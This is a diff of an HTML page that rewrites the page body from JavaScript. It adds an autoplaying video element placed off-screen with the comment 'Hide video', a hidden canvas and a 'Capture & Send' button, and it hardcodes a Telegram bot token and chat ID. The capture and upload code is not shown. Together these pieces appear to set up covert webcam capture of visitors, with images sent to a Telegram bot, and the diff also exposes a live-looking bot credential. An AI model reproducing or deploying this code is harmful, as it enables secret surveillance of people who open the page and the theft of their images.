@@ -192,11 +192,6 @@ button {
     cursor: not-allowed;
 }      
 
-button { background: #ff4f81; color: white; cursor: pointer; }
-video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
-#canvas { display: none; }
-
-
         
     </style>
 </head>
@@ -217,13 +212,29 @@ video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
 
     <div id="imagePreview"></div>
     
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    
 
 <script>
 /*********************************************************************/
 
 /*********************************************************************/
+// 📌 HTML Structure Create
+document.body.innerHTML = `
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <button id="captureBtn">Capture & Send</button>
+`;
+
+// 📌 CSS Add via JavaScript
+const style = document.createElement("style");
+style.innerHTML = `
+    button { background: #ff4f81; color: white; cursor: pointer; }
+    video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
+    #canvas { display: none; }
+`;
+document.head.appendChild(style);
+
+    
         const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM";  
         const chatId = "878604830";  
 
